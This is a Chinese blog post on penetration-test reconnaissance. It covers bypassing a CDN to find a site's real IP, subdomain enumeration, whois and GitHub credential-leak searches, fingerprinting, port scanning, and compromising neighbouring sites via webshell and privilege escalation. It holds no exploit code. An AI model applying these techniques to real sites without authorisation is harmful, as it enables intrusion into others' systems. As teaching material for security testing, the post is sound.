在渗透测试过程中，经常会碰到网站有CDN的情况。CDN即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。说的简单点，就是一组在不同运营商之间的对接点上的高速缓存服务器，把用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。 如何判断网站是否有CDN？ 很简单，使用不同地方的 ping 服务，查看对应 IP 地址是否唯一，如果不唯一则极有可能是使用了CDN #绕过CDN查找网站真实ip (1)查询子域名：毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。 查询子域名有三种方法： 1、通过爆破子域名进行查询，如 Layer子域名爆破机、subDomainBrute，在线子域名查询网站：https://phpinfo.me/domain/ 2、通过查询DNS服务器，查询该域下的解析记录 3、通过HTTPS证书来查询(只适用于https网站) ，如：https://crt.sh/ 就是通过https证书查询子域名 4、通过google查询 （1）Layer子域名爆破机 Layer是windows下的一款子域名探测工具，其工作原理是利用子域名字典进行爆破，使用简单容易上手。 （2）subDomainBrute subDomainBrute的特点是可以用小字典递归的发现三级域名、四级域名、甚至五级域名等不容易被探测到的域名。 字典较为丰富，小字典就包括1万5千条，大字典多达6万3千条 默认使用114DNS、百度DNS、阿里DNS这几个快速又可靠的Public DNS查询，可修改配置文件添加DNS服务器（在dict里面可以进行添加） 自动去重泛解析的域名，当前规则： 超过2个域名指向同一IP，则此后发现的其他指向该IP的域名将被丢弃 我这里就是使用的subDomainBrute： 因为字典很大，所以速度有点慢 （3）利用google查询 指定站点，然后-就是不包含这个，来查询 site:baidu.com -www (2)查询主域名：以前用CDN的时候有个习惯，只让WWW域名使用cdn，秃域名不适用，为的是在维护网站时更方便，不用等cdn缓存。所以试着把目标网站的www去掉，ping一下看ip是不是变了。 (3)邮件服务器：一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(必须是目标自己的邮件服务器，第三方或者公共邮件服务器是没有用的)。 (4)查看域名历史解析记录：也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过网站https://www.netcraft.com 来观察域名的IP历史记录。 (5)国外访问：国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站https://asm.ca.com/en/ping.php 访问 ，可能会得到真实的ip地址。 (6)Nslookup查询：查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。传送门：各种解析记录 (7)网站漏洞：利用网站自身存在的漏洞，很多情况下会泄露服务器的真实IP地址 (8)Censys查询SSL证书找到真实IP：利用“Censys网络空间搜索引擎”搜索网站的SSL证书及HASH，在https://crt.sh上查找目标网站SSL证书的HASH，然后再用Censys搜索该HASH即可得到真实IP地址。 绕过CDN查找网站真实ip部分结束 域名的whois信息：whois是用来查询域名注册所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令行接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。 通常，我们进行whois查询是去： 站长之家whois查询 。然后查出来信息之后，可以根据查询出来的邮箱、注册人、公司、电话等进行反查。http://whois.chinaz.com #公司敏感信息网上搜集 当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。Github搜索语法：https://blog.csdn.net/qq_36119192/article/details/99690742 #网站指纹识别 在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。CMS又称整站系统。常见的CMS有：WordPress、Dedecms、Discuz、PhpWeb、PhpWind、Dvbbs、PhpCMS、ECShop、、SiteWeaver、AspCMS、帝国、Z-Blog等。 常见的网站指纹识别工具有：whatweb等。 在线指纹识别网站： BugScaner：http://whatweb.bugscaner.com/look/云悉指纹：http://www.yunsee.cn/finger.htmlWhatWeb：https://whatweb.net/ #整站分析 服务器类型(Linux/Windows) 服务器信息包括服务器用的操作系统：Linux 还是 Windows 。现在企业网站服务器的操作系统有百分之九十以上用的是Linux操作系统。知道了服务器的操作系统之后，还需要知道操作系统使用的具体版本。因为很多低版本的操作系统都存在已知的漏洞。 判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。但是，通过TTL值来判断服务器类型也不是百分之百准确的，有些windows服务器的TTL值也是几十，而且有的服务器禁止ping。 ping一下自己的网站试试，结果正确。 tips：看到个评论不知道对不对，暂且先记着：分享一个操作系统的简单区别方式，Linux系统对大小写敏感，Windows不敏感。所以我们在访问的时候可以尝试把路径部分改成大写，然后去访问，看能否请求成功。Linux系统会找不到文件的，Windows可以找到，因为对大小写不敏感. 而判断目标网站服务器的具体的版本的话，可以采用 nmap 进行扫描， -O 和 -A 参数都能扫描出来 网站容器(Apache/Nginx/Tomcat/IIS) 知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。 脚本类型(php/jsp/asp/aspx) 我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。1：可以根据网站URL来判断2：site:xxx filetype:php3：可以根据Firefox的插件来判断 数据库类型(Mysql/Oracle/Accees/Mqlserver) 我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的 几种数据库的区别： Access 全名是Microsoft Office Access，是由微软发布的关联式数据库管理系统。小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名： .mdb 一般是asp的网页文件用access数据库 SQL Server是由Microsoft开发和推广的关系数据库管理系统（DBMS），是一个比较大型的数据库。端口号为1433。数据库后缀名 .mdf MySQL 是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL是最流行的关系型数据库管理系统，在 WEB 应用方面MySQL是最好的应用软件之一，MySQL数据库大部分是php的页面。默认端口是3306 Oracle又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。常用于比较大的网站。默认端口是1521 首先，成本上的差距，access是不要钱的，mysql也是开源的，sql server 是收费的一般也就几千，Oracle的费用则数万。其次，处理能力，access支持千以内的访问量，sql server支持几千到上万的访问，而Oracle则支持海量的访 问。再次，从数据库的规模来看，access是小型数据库，，mysql 是中小型数据库，sql server是中型数据库，Oracle是大型数据库。 常见搭配： ASP 和 ASPX：ACCESS、SQL Server PHP：MySQL、PostgreSQL JSP：Oracle、MySQL #主机扫描(Nessus) 对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。 主机扫描的工具也有很多，比如：Nessus #端口扫描(nmap) 上面演示过了，这里就跳过了。Nmap使用详解：https://blog.csdn.net/qq_36119192/article/details/82079150常见危险端口及漏洞利用：https://blog.csdn.net/qq_36119192/article/details/84781477?ops_request_misc=%7B%22request_id%22%3A%22158176934719725219927367%22%2C%22scm%22%3A%2220140713.130056874..%22%7D&amp;request_id=158176934719725219927367&amp;biz_id=0&amp;utm_source=distribute.pc_search_result.none-task #网站敏感目录和文件不知道平时打CTF的dirsearch能不能用。。。 #旁站和C段扫描 旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！ 对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。 旁站和C段在线查询地址： http://www.webscan.cc/https://phpinfo.me/bing.php 网站漏洞扫描 网站漏洞扫描就是直接对网站进行漏洞探测了。网站漏洞扫描也有很多工具。比如 AWVS、AppScan、OWASP-ZAP、nessuss等等。但是需要注意的是，使用漏扫工具直接对网站进行扫描，因为一下子流量过大，有些网站可能会崩溃。所以一般最好不要使用漏洞扫描工具对网站进行扫描。并且如果未经授权就用漏扫对网站进行扫描还是违法的！ AWVS:https://blog.csdn.net/qq_36119192/article/details/83187475AppScan:https://blog.csdn.net/qq_36119192/article/details/83187475 下一篇博客找个小网站实战一下上述的内容。 参考链接：https://blog.csdn.net/qq_36119192/article/details/84674109","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]}]}